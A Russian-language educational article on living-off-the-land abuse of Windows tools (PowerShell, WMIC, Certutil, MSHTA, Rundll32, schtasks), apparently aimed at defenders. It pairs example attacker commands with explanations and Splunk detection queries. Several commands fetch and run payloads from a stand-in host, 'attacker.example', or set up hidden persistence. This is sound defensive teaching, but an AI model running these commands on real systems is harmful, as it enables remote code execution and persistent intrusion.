Аналогия с реальным миром, это техника ведения партизанской войны с учетом того что солдат выживает за счет того что есть вокруг не используя других ресурсов

Основные abused инструменты позволяют использовать скрипты, управлять файлами или планирования, что соответствует типичным потребностям атакующего, таким как execution, persistence, reconnaissance и lateral movement
Примерами таких программ можно считать: 

- CMD и PowerShell - используются для in-memory скриптинга, удаленных скачиваний и автмоатизации
- WMIC или WMI - используются чтобы запускать команды локально или на удаленном хосте и запрашивать состояние системы
- Certutil - используется для получения файлов, кодирования и декодирования пейлоадов
- Mshta - используется для запуска HTA контента или инлайн скриптов доставленных через документ или ссылку
- Rundll32 - используется для вызова экспортируемых DLL или запуска обработчика URL
- Scheduled tasks - используется для запуска кода при входе в систему или по расписанию для обеспечения постоянного доступа

Операторы также злоупотребляют подписанными административными утилитами из пакета Sysinternals - например, PSExec для удаленного выполнения и Autoruns для обнаружения и манипуляции точками закрепления - потому что эти инструменты сливаются с легитимными рабочими процессами администраторов.

Такие техники не ограничиваются только windows, похожие есть и для Unix систем и публичные документации содержат паттерны использования, например: 
[LOLBAS](https://lolbas-project.github.io/) - для Windows
[GTFOBins](https://gtfobins.github.io/) - для Unix
Знание того какие инструменты с наибольшей вероятностью могут быть использованы не по назначению и типичных целей такого использования помогает специалистам по кибербезопасности настраивать логирование, получать полные командные строки и деревья процессов, а так же расставлять приоритеты при оповещениях, когда безобидные исполняемые файлы ведут себя явно вредоносным образом.

# Примеры LoL активности
## Powershell
```powershell
PS C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')" 
PS C:\> powershell -NoP -NonI -W Hidden -EncodedCommand SQBn...Base64... 
PS C:\> powershell -NoP -NonI -Command "Invoke-WebRequest 'http://attacker.example/file.exe' -OutFile 'C:\Users\Public\updater.exe'; Start-Process 'C:\Users\Public\updater.exe'"
```

В примере выше команда использует шаблон IEX чтобы загрузить скрипт с удаленного сервера и немедленно запустить его в памяти избегая артефактов на диске и замедляя обнаружение. Во второй команде параметр `-EncodedCommand` скрывает полезную нагрузку в формате base64, поэтому эксперты и простые фильтры могут пропустить намерение Злоумышленника. И наконец она загружает файл exe

Пример обнаружения: 
```
index=wineventlog OR index=sysmon (EventCode=4688 OR EventCode=1 OR EventCode=4104)
(CommandLine="*powershell*IEX*" OR CommandLine="*powershell*-EncodedCommand*" OR CommandLine="*powershell*-Exec Bypass*" OR CommandLine="*Invoke-WebRequest*" OR CommandLine="*DownloadString*" OR CommandLine="*Invoke-RestMethod*")  
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```
(Это строка запроса для splunk)
## WMIC
Windows Managment Instrumentation Command Line - дает администраторам запрашивать и управлять локальными или удаленными windows системами. Это так же используется злоумышленника для исполнения удаленных команд путем запуска новых процессов

```powershell
PS C:\> wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')" 
PS C:\> wmic /node:TARGETHOST process get name,commandline 
PS C:\> wmic process call create "notepad.exe" /hidden
```

В первой команде WMIC оператор нацелился на удаленный хост и запрашивает у удаленной системы создание нового процесса. Этот новый процесс представляет собой экземпляр PowerShell, который загружает и выполняет удаленный скрипт, поэтому WMIC выступает в качестве удаленного запускателя.
Затем во второй команде WMIC инструмент запрашивает у удаленной системы информацию о запущенных процессах и командных строках, возвращая структурированную информацию полезную для разведки на разных хостах.
В третьей команде WMIC используется локальный API вызова процесса WMIC create для запуска notepad.exe. На той же машине необязательный флаг сокрытия демонстрирует как злоумышленник может пытаться сделать запущенный процесс менее заметным.

```
index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688)
(CommandLine="*\\wmic.exe*process call create*" OR CommandLine="*wmic /node:* process call create*" OR CommandLine="*wmic*process get Name,CommandLine*")  
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

## Certutil
Certutil это утилита Microsoft для управления сертификатами и кодированием и декодированием данных. Certutil предназначен для управления сертификатами, он может скачивать файлы вместе с `-urlcache` и декодировать base64 пейлоады, преобразовывать текстовые блоки в бинарные файлы. Атакующие используют его потому что он подписан Microsotft и широко распространен в административных процессах. Он может получать файлы без использования curl и подобных утилит и обходит некоторые правила блокировки 

Злоумышленники используют Certutil для скачивания файлов, декодирования base64 пейлоадов или для маскировки вредоносного кода как легитимные операции сертификации. Благодаря сетевым возможностям и функциям обработки файлов, это универсальный инструмент для подготовки полезных нагрузок или расшифровки зашифрованных скриптов.

```powershell
PS C:\> certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe  
PS C:\> certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\decoded.exe  
PS C:\> certutil -encode C:\Users\Public\payload.exe C:\Users\Public\payload.b64
```

В первой команде `-urlcache -split -f` флаги позволяют получить удаленный url и записать это в специальный локальный путь, как результат, файл доставлен на диск и может быть исполнен позже
Во второй команде certutil читает base64 текстовый файл, декодирует и записывает результат в бинарник, так атакующий может перемещать бинарные данные как текст а после воспроизводить его на хосте
Третья команда кодирует бинарник в base654. Это можно использовать для обфускации пейлоада во время подготовки и транспортировки 

```
index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688 OR EventCode=4663) 
(Image="*\\certutil.exe" OR CommandLine="*certutil*")
(CommandLine="* -urlcache * -f *" OR CommandLine="* -decode *" OR CommandLine="* -encode *")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

## MSHTA
MSHTA запускает HTML файлы, который могут содержать VBScript или код JavaScript

```powershell
PS C:\> mshta "http://attacker.example/payload.hta"  
PS C:\> mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -NonI -W Hidden -Command "Start-Process calc.exe"');close();"  
PS C:\> mshta "C:\Users\Public\malicious.hta"
```

В первой команде, mshta загружает HTA с удаленного сервера и исполняет HTA на хосте
Во второй командой mshta получает встроенный URI JS который создает объект ActiveX WScript.Shell и использует его для запуска Powershell
В третьей команде MSHTA выполняет запуск локального HTA файла, что полезно если злоумышленник распространяет HTA файл в виде вложения или размещает его на общем диске

```
index=sysmon (EventCode=1 OR EventCode=4688) Image="*\\mshta.exe" (CommandLine="*http*://*" OR CommandLine="*javascript:*" OR CommandLine="*.hta")
| stats count by host, user, ParentImage, CommandLine
```
## Rundll32
Rundll32 исполняет специфические функции из DLL файлов

```powershell
PS C:\> rundll32.exe C:\Users\Public\backdoor.dll,Start  
PS C:\> rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"  
PS C:\> rundll32.exe C:\Windows\Temp\loader.dll,Run
```

В первой команде rundll32 загружает специфическую dll и вызывает из нее экспортированную функцию Start, которая выполняет код DLL
Во второй команде вызывается url.dll с FileProtocolHandler и удаленным URL, что заставляет системный обработчик обрабатывать удаленное содержимое, которое может инициализировать дальнейшую активность.
Третья команда вызывается специально созданным экспортом во временную DLL, которая может выполнять встроенную логику загрузчика или шелл-код из файла, расположенного в доступном для записи месте 

```
index=sysmon (EventCode=1 OR EventCode=4688 OR EventCode=7) Image="*\\rundll32.exe" (CommandLine="*\\Users\\Public\\*" OR CommandLine="*url.dll,FileProtocolHandler*" OR CommandLine="*\\Windows\\Temp\\*")
| stats count by host, user, ParentImage, CommandLine
```

## Scheduled tasks(schtasks/task Scheduler)
Планировщик задач это встроенная функция автоматизации windows, он позволяет администраторам запускать программы или скрипты в указанное время, при таких событиях как вход в систему или по повторяющемуся расписанию. Задачи имеют имя, триггер(то есть когда запускать), действие(что запускать) и необязательную учетную запись для запуска условия. Поскольку это стандартный административный инструмент, задачи отображаются в обычных системных журналах и часто разрешены политикой, что делает его ценным механизмом как для легитимных операций, так и для обеспечения устойчивости злоумышленников
Злоумышленники создают или изменяют задачи для обеспечения устойчивости после перезагрузки, для запуска кода при входе пользователя в систему или с регулярной переодичностью или для быстрого повторного запуска после удаления других артефактов, они часто выбирают имена задач, которые выглядят безобидными, например windowsUpdate или Maintenance, чтобы избежать привлечения внимания. Задачи могут запускать Powershell, подписанные инструменты или локальные скрипты.

```powershell
PS C:\> schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')\""  
PS C:\> schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05  
PS C:\> schtasks /Run /TN "WindowsUpdate"
```

В первой команде schtasks создается задача с именем WindowsUpdate, которая запускается при входе в систему, действие запускает PowerShell который загружает и выполняет удаленный скрипт при каждом входе пользователя в систему, обеспечивая постоянное присутствие
Во второй команде schtasks планируется ежедневная задача с именем Daily Job, которая запускает локальный скрипт в 00:05 каждый день. Это может автоматизировать повторяющиеся вредоносные действия, такие как запланированное щифрование или поэтапный сбор данных
В третьей команде schtasks злоумышленник запускает именованную задачу немедленно, вызывая настроенное действие по запросу

```
index=wineventlog EventCode=4698 OR EventCode=4699 OR index=sysmon (EventCode=1 OR EventCode=4688) (CommandLine="*schtasks* /Create*" OR CommandLine="*schtasks* /Run*" OR Image="*\\taskeng.exe" OR EventCode=4698)
| stats count by host, user, EventCode, TaskName, CommandLine
```
